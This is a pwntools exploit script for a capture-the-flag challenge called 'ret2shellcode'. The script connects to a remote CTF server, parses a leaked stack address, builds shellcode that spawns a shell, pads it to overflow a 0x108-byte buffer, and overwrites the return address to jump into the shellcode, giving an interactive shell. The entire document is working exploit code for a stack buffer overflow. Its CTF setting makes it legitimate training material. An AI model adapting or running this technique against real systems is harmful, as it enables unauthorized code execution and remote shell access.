from pwn import *

context.log_level = "debug"
context.binary = './ret2shellcode'
io = remote("ctf.cybr.club", 443, ssl=True, sni="ret2shellcode")
# io = gdb.debug('./ret2shellcode')

# Getting address of variable 'password'
io.recvuntil('vault of ')
password = io.recvline()[:-1]
password = (int(password, 0))

# Writing payload
payload = asm(shellcraft.sh())
payload = payload.ljust(0x108, b'A')
payload += p64(password)

# Sending payload
io.sendline(payload)

io.interactive()

